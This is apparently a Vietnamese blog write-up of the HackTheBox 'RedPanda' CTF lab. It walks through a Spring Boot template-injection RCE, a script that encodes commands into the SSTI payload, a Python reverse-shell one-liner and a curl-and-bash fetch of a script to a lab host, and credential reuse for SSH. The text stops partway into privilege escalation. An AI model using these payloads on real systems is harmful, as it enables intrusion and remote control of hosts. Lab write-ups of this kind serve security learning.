---
layout: post
author: "Neo"
title: "HackTheBox - RedPanda"
date: "2022-10-24"
tags: [
    "web",
    "linux",
    "spring boot",
    "ssti",
    "apache IOUtils library",
    "pspy",
    "java",
    "xxe",
    "ssh",
    "hackthebox"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-10-24-HTB-RedPanda/1.png)

Song song với việc reup lại những writeup cũ, tôi vẫn tiếp tục giải các CTF mới khi có thời gian. Và hôm nay, có thời gian rảnh 1 chút thì tôi thử sức với [Hackthebox - RedPanda](https://app.hackthebox.com/machines/481)

## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm là quét các cổng đang mở trên máy chủ mục tiêu.

```python
┌──(neo㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.10.11.170                                                        
[sudo] password for neo: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-24 02:27 EDT
Nmap scan report for 10.10.11.170
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 24 Oct 2022 06:27:24 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 24 Oct 2022 06:27:24 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 24 Oct 2022 06:27:24 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=10/24%Time=63563048%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;chars
SF:et=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Mon,\x2024\x20Oct\x2
SF:02022\x2006:27:24\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20
SF:\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"wood
SF:en_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codep
SF:en\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"styles
SF:heet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/
SF:css\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20
SF:with\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20
SF:\x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20cla
SF:ss='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20
SF:right'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\
SF:x20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20<
SF:/div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\
SF:x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20M
SF:on,\x2024\x20Oct\x202022\x2006:27:24\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text
SF:/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2043
SF:5\r\nDate:\x20Mon,\x2024\x20Oct\x202022\x2006:27:24\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>
SF:HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x
SF:20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h
SF:1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\
SF:x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14p
SF:x;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heig
SF:ht:1px;background-color:#525D76;border:none;}</style></head><body><h1>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></htm
SF:l>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
                                   
┌──(neo㉿kali)-[~]
└─$  
```

Truy cập vào web với port 8080

Trang web có 1 phần input, tôi thử ngay với các XSS hay XXE, nhưng đều thất bại. 

![web](/assets/img/2022-10-24-HTB-RedPanda/2.png)

Khi nhập thử `id`, tôi nhận được thông tin của 1 loại gấu trúc, nhưng thử các command khác thì đều không có kết quả. Tuy nhiên dưới phần "Author", tôi có 1 cái tên "woodenk", click vào nó và tôi có 2 thư mục chứa ảnh về gấu trúc. Không có gì đặc biệt để có thể khai thác ở đây.

![url](/assets/img/2022-10-24-HTB-RedPanda/3.png)

Tôi nhận ra url này giống với form của PHP LFI payload nên đã thử các trường hợp nhưng đều không có kết quả.

## SSTI

Quay lại nmap thì tôi nhận ra tôi đã bỏ qua title của web này "Made with Spring Boot". Phân tích qua Spring Boot thì đây là 1 extension của Spring Framework giúp đơn giản hóa các bước cấu hình trong lập trình và được viết bằng java.

Một điều quan trọng nữa là Spring Boot sử dụng Template engine để thao tác với dữ liệu để in nó ra màn hình, nên tôi thử tìm exploit hay payload liên quan đến Template injection và tôi tìm thấy kết quả ở [đây](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---basic-injection)

SSTI (Server Side Template Injection) cũng na ná giống XXS là cho phép kẻ tấn công nhập các đầu vào không an toàn như các đoạn code HTML hay các ký tự đặc biệt

```python
${7*7}
*{7*7}
#{7*7}
```

Còn rất nhiều những payload đơn giản khác để kiểm tra, và tôi nhận được kết quả với `*{7*7}` 

Với payload tìm được phía trên, tôi sẽ thử thay $ bằng * ở đầu payload

![payload](/assets/img/2022-10-24-HTB-RedPanda/4.png)

Nhưng làm cách nào để hiểu được payload này? 

Tôi tìm được trên github 1 lời giải thích khá rõ ràng, nó ở [đây](https://gist.githubusercontent.com/nani1337/8010d7a625e5f90ec026bab32ffb5cc2/raw/ed3fda09b1a3619c1bf52afc62728b030d1f8a4d/spring%2520to%2520rce). 

*The payload became quite huge. To sum up, I used the Apache IOUtils library. I converted cat etc/passwd into ASCII characters using the character class, passed this value to the exec() method and got the input stream and passed it to the toString() method of IOUtils class. Awesome isnt it.*

```python
#!/usr/bin/env python
from __future__ import print_function
import sys

message = input('Enter message to encode:')

print('Decoded string (in ASCII):\n')
for ch in message:
   print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=""), 
print('\n')
```

Code này chỉ sinh ra format của mã ASCII chứ không đầy đủ payload nên tôi sẽ sửa nó để có thể RCE.

```python
#!/usr/bin/python
from __future__ import print_function
import sys

message = input('Enter message to encode:')
encode = []

print('Ecoded string (in ASCII):\n')

for ch in message:
	encode.append(str(ord(ch)))
	
	payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % encode[0]
   
for ch in encode[1:]:
	
	payload += ".concat(T(java.lang.Character).toString({}))".format(ch)

payload += ").getInputStream())}"

print(payload)
```

Thử sử dụng command "cat /etc/passwd" và đối chiếu với kết quả trong payload mẫu và nó trùng khớp, nghĩa là code của tôi đã đúng.

Tôi sẽ dùng payload của python để RCE về máy mình

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",2402));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

```python
┌──(neo㉿kali)-[~]
└─$ python test.py
Enter message to encode:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",2402));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
Ecoded string (in ASCII):

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(112).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(39)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(75)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(39))).getInputStream())}
                                            
┌──(neo㉿kali)-[~]
└─$ 
```

Tạo listener trên máy remote: `nc - lnvp 2402`

Bây giờ thì sao chép đoạn code dài ngoằng phía trên vào phần command. Nhưng sau 1 thời gian loay hoay mãi tôi cũng không thể nào gọi được shell, kể cả đã upload thành công 1 file shell php lên server như thế này

```python
┌──(neo㉿kali)-[~]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.170 - - [31/Oct/2022 04:53:21] "GET /shell.php HTTP/1.1" 200 -
```

Tôi cũng không thể nào gọi được shell về, đành phải ngồi gõ lệnh thủ công rồi chuyển nó thành java để tìm hiểu bên trong này không.

## User flag 

Với cách trên thì tôi cũng đã có thể lấy *user flag* thành công vì hiện tại tôi đang ở truy cập với user *woodenk* và *user flag* nằm trong thư mục user này.

![user-flag](/assets/img/2022-10-24-HTB-RedPanda/5.png)

Chuyển đổi câu lệnh `cat /home/woodenk/user.txt` thành code java và thử lại, tôi sẽ có *user flag*.

Sau 1 lúc cosplay chú bé đần thì tôi mới nhận ra là tôi đang không ở thư mục mà tôi có thể thực thi được shell vì không có quyền. Và để cho chắc chắn thì tôi sẽ nhét lại shell vào /tmp/ và chạy nó với bash. Chuyển command bên dưới thành code java:

`curl 10.10.14.4:8000/exploit.sh --output /tmp/exploit.sh`

Cuối cùng là `bash /tmp/exploit.sh`

*Note: tất cả command đều chuyển thành code java*

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 2402 
listening on [any] 2402 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.170] 39958
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
woodenk@redpanda:/tmp/hsperfdata_woodenk$ id
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 
```

## SSH

Sau khi thử qua các phương pháp đơn giản như `sudo -l` hay `find` đều không có kết quả, tôi sẽ thử tải lên `linpeas.sh` để phân tích machine này 

![linpeas.sh](/assets/img/2022-10-24-HTB-RedPanda/6.png)

Sau khi phân tích qua kết quả, tôi để ý thấy user *root* thực thi file jar trong thư mục */opt* 

```python
woodenk@redpanda:/opt$ ll
ll
total 24
drwxr-xr-x  5 root root 4096 Jun 23 18:12 ./
drwxr-xr-x 20 root root 4096 Jun 23 14:52 ../
-rwxr-xr-x  1 root root  462 Jun 23 18:12 cleanup.sh*
drwxr-xr-x  3 root root 4096 Jun 14 14:35 credit-score/
drwxr-xr-x  6 root root 4096 Jun 14 14:35 maven/
drwxrwxr-x  5 root root 4096 Jun 14 14:35 panda_search/
woodenk@redpanda:/opt$ 
```

Sau 1 lúc kiểm tra qua tất cả các thư mục này, tôi tìm thấy 1 thứ mình cần 

```python
woodenk@redpanda:/opt$ ls -la panda_search/target/classes/com/panda_search/htb/panda_search
total 28
drwxrwxr-x 2 root root 4096 Jun 20 13:51 .
drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
-rw-rw-r-- 1 root root 6460 Jun 20 13:51 MainController.java
-rw-rw-r-- 1 root root 1416 Jun 20 13:51 PandaSearchApplication.java
-rw-r--r-- 1 root root 2957 Jun 20 13:51 RequestInterceptor.java
-rw-rw-r-- 1 root root 2128 Feb 21  2022 SqlController.java
woodenk@redpanda:/opt$ 
```

`MainController.java`

```python
<h/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java
cat MainController.java
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
                SAXBuilder saxBuilder = new SAXBuilder();
                if(author == null)
                author = "N/A";
                author = author.strip();
                System.out.println('"' + author + '"');
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }
                else
                {
                        model.addAttribute("noAuthor", true);
                        return new ModelAndView("stats.html");
                }
        }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
                }
        }
  @PostMapping("/search")
        public ModelAndView search(@RequestParam("name") String name, Model model) {
        if(name.isEmpty())
        {
                name = "Greg";
        }
        String query = filter(name);
        ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
        model.addAttribute("pandas", pandas);
        model.addAttribute("n", pandas.size());
        return new ModelAndView("search.html");
        }
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
<h/src/main/java/com/panda_search/htb/panda_search$ 
```

Vậy là tôi có user *woodenk* và pass *RedPandazRule* để login vào database *red_panda*, nhưng trước đó tôi sẽ thử dùng pass này để login ssh 

```python
┌──(neo㉿kali)-[~]
└─$ ssh woodenk@10.10.11.170
woodenk@10.10.11.170's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 02 Nov 2022 07:51:51 AM UTC

  System load:           0.06
  Usage of /:            79.0% of 4.30GB
  Memory usage:          45%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:59a0


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Jul  5 05:51:25 2022 from 10.10.14.23
woodenk@redpanda:~$ 
```

## Privilege escalation

Trong lúc truy cập machine thông qua RCE tôi đã để ý có 1 file tên *pspy64*, nó làm tôi nghĩ đến *[pspy](https://github.com/DominicBreuker/pspy)*. Đây là công cụ có thể theo dõi được các tiến trình chạy trên máy mà không cần quyền *root*

Khi chạy thử nó thì tôi nhận thấy có vài tiến trình hơi khó hiểu 

```python
2022/11/02 08:30:01 CMD: UID=1000 PID=2156   | /bin/bash /opt/cleanup.sh 
2022/11/02 08:30:01 CMD: UID=1000 PID=2157   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
2022/11/02 08:30:01 CMD: UID=1000 PID=2163   | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
2022/11/02 08:30:01 CMD: UID=1000 PID=2164   | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ; 
2022/11/02 08:30:01 CMD: UID=1000 PID=2166   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
2022/11/02 08:30:01 CMD: UID=1000 PID=2165   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
2022/11/02 08:30:01 CMD: UID=1000 PID=2177   | /bin/bash /opt/cleanup.sh 
2022/11/02 08:30:01 CMD: UID=1000 PID=2179   | /bin/bash /opt/cleanup.sh 
2022/11/02 08:30:01 CMD: UID=1000 PID=2181   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 
2022/11/02 08:30:19 CMD: UID=???  PID=2185   | ???
2022/11/02 08:32:00 CMD: UID=???  PID=2187   | ???
```

Tại sao phải xóa các tệp đuôi xml hay jpg? 

Thực sự thì đến đây tôi phải xem 1 chút giải thích của những người đã làm trước đó vì thực sự tôi không tìm được hướng đi tiếp theo.

Theo những gì đọc được và hiểu được thì tôi sẽ tiếp tục phân tích file java phía trên. Ở đó có 1 đoạn code để xuất ra file xml với format `"/credits/" + author + "_creds.xml"` 

Tôi thử tìm tất cả các file java để kiểm tra và phân tích xem có gì đặc biệt không.

```python
woodenk@redpanda:~$ find / -type f -name *.java 2>/dev/null
/opt/panda_search/.mvn/wrapper/MavenWrapperDownloader.java
/opt/panda_search/src/test/java/com/panda_search/htb/panda_search/PandaSearchApplicationTests.java
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/PandaSearchApplication.java
/opt/credit-score/LogParser/final/.mvn/wrapper/MavenWrapperDownloader.java
/opt/credit-score/LogParser/final/src/test/java/com/logparser/AppTest.java
/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java
